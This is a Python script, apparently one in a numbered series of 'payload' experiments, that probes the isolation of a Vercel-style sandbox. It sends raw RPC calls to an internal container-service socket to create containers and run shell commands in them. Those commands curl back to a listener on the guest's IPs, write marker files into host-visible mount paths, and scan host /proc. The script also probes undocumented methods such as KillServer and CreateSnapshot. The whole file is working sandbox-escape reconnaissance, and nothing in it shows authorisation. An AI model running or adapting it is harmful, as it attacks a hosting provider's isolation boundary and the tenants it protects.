# -*- coding: utf-8 -*-
"""v77 payload: Exec 进程网络位置验证 (真实 IP 回连) + 剩余方法探测 + 宿主 /proc 复查
v74 用 127.0.0.1 回连 HITS=0; v76 证明 Exec 进程不在宿主 /proc
本实验: 获取 guest 自身真实 IP, 起 HTTP server, Exec curl 真实 IP 回连
- 若 HITS>0  -> Exec 进程与 guest 同网络域 (宿主网络 ns 或可路由)
- 若 HITS=0  -> Exec 进程在完全隔离的网络 (其他 VM/容器)
另: 探测 Stdin/KillServer/StreamOutput/Stop/StopContainer 等剩余方法"""
import socket, time, os, glob, json, subprocess, threading
from http.server import BaseHTTPRequestHandler, HTTPServer

OUT = '/vercel/sandbox/v77c.out'
HITS = []


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in (OUT, '/mnt/h/volumes/run/vercel/share/v77c2.out'):
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        HITS.append((time.time(), 'GET ' + self.path, str(self.client_address)))
        self.send_response(200)
        self.send_header('Content-Length', '4')
        self.end_headers()
        self.wfile.write(b'hit!')
        log('SERVER GET %s from %s' % (self.path, self.client_address))

    def do_POST(self):
        n = int(self.headers.get('Content-Length', 0))
        b = self.rfile.read(n) if n else b''
        HITS.append((time.time(), 'POST ' + self.path, str(self.client_address)))
        self.send_response(200)
        self.send_header('Content-Length', '2')
        self.end_headers()
        self.wfile.write(b'ok')
        log('SERVER POST %s len=%d from %s' % (self.path, n, self.client_address))

    def log_message(self, *a):
        pass


def rpc(path, body='{}', t=3):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:800].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def exec_cmd(ctr, cid, argv, t=6):
    body = json.dumps({"containerId": cid, "process": {"argv": argv}})
    return rpc(ctr + '/Exec', body, t=t)


def get_my_ips():
    ips = []
    try:
        r = subprocess.run(['hostname', '-I'], capture_output=True, timeout=3)
        if r.returncode == 0:
            ips += r.stdout.decode().split()
    except Exception:
        pass
    try:
        r = subprocess.run(['ip', 'addr'], capture_output=True, timeout=3)
        for ln in r.stdout.decode(errors='replace').splitlines():
            ln = ln.strip()
            if ln.startswith('inet '):
                ips.append(ln.split()[1].split('/')[0])
    except Exception:
        pass
    # UDP connect 技巧获取出口 IP
    for gw in ('100.64.0.1', '8.8.8.8', '1.1.1.1'):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1)
            s.connect((gw, 9))
            ips.append(s.getsockname()[0])
            s.close()
        except Exception:
            pass
    seen = []
    for i in ips:
        if i not in seen:
            seen.append(i)
    return seen


def main():
    log('V77 payload start pid=%d' % os.getpid())
    ips = get_my_ips()
    log('MY_IPS=%s' % ips)

    srv = HTTPServer(('0.0.0.0', 18080), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    log('server on 18080')

    CTR = '/vercel.hive.cell.api.containers.v1.ContainersService'
    st, bd = rpc(CTR + '/Create', '{"drive_id":"sandbox"}')
    cid = bd.split('"containerId":"')[1].split('"')[0] if '"containerId"' in bd else None
    log('ID=%s' % (cid or 'NONE'))
    if not cid:
        log('V77C_DONE')
        return
    rpc(CTR + '/Start', '{"containerId":"%s"}' % cid, t=5)
    log('started')
    time.sleep(1)

    # 1) Exec A: 真实 IP 回连 (每个 IP 都试)
    for i, ip in enumerate(ips):
        st, bd = exec_cmd(CTR, cid, ['/bin/sh', '-c',
                          'curl -s --max-time 5 http://%s:18080/pa%d || echo PA%dFAIL' % (ip, i, i)], t=8)
        log('execA[%d] ip=%s -> %s | %s' % (i, ip, st, bd[:120]))
        time.sleep(1.5)

    # 2) Exec B: 长驻 sleep 120 (宿主 /proc 复查)
    st, bd = exec_cmd(CTR, cid, ['/bin/sh', '-c', 'echo V77MARK > /tmp/v77mark; sleep 120'])
    log('execB -> %s | %s' % (st, bd[:120]))
    time.sleep(2)

    # 3) 宿主 /proc 差分复查
    base2 = {}
    for p in glob.glob('/proc/[0-9]*'):
        try:
            base2[os.path.basename(p)] = open(p + '/cmdline', 'rb').read()[:50]
        except Exception:
            pass
    log('proc count now=%d' % len(base2))
    for pid, cl in base2.items():
        if b'v77mark' in cl or b'sleep 120' in cl:
            log('FOUND %s %r' % (pid, cl))

    # 4) 剩余方法探测
    for m in ['Stdin', 'KillServer', 'StreamOutput', 'Stop', 'StopContainer', 'Attach',
              'GetImageConfig', 'SetOCIImageConfig', 'CreateSnapshot']:
        st, bd = rpc(CTR + '/' + m, '{}', t=3)
        log('method %s -> %s | %s' % (m, st, bd[:150]))

    # 5) Exec C: 文件副作用 (宿主可见 bind 区 + drive 视角多路径)
    cmdC = ('echo C1 > /run/vercel/share/v77c1 2>&1; '
            'echo C2 > /vercel/sandbox/v77c2 2>&1; '
            'echo C3 > /tmp/v77c3 2>&1; '
            'echo C4 > /mnt/h/volumes/run/vercel/share/v77c4 2>&1; '
            'echo C5 > /mnt/vdax/run/vercel/share/v77c5 2>&1; '
            'echo C6 > /run/cell/v77c6 2>&1; '
            'echo DONE')
    st, bd = exec_cmd(CTR, cid, ['/bin/sh', '-c', cmdC], t=8)
    log('execC -> %s | %s' % (st, bd[:120]))

    # 6) 轮询 HITS + 文件副作用
    t_wait = 0
    while t_wait < 12:
        time.sleep(1)
        t_wait += 1
        for t0, h, src in list(HITS):
            log('HIT %s from %s' % (h, src))
            HITS.remove((t0, h, src))
        for p in ['/run/vercel/share/v77c1', '/vercel/sandbox/v77c2', '/tmp/v77c3',
                  '/mnt/h/volumes/run/vercel/share/v77c4', '/mnt/vdax/run/vercel/share/v77c5',
                  '/run/cell/v77c6']:
            try:
                if os.path.exists(p) and os.path.getsize(p) > 0:
                    log('SIDE %s: %s' % (p, open(p, errors='replace').read()[:100]))
            except Exception:
                pass

    rpc(CTR + '/Kill', '{"containerId":"%s"}' % cid)
    log('killed')
    log('V77C_DONE')


main()
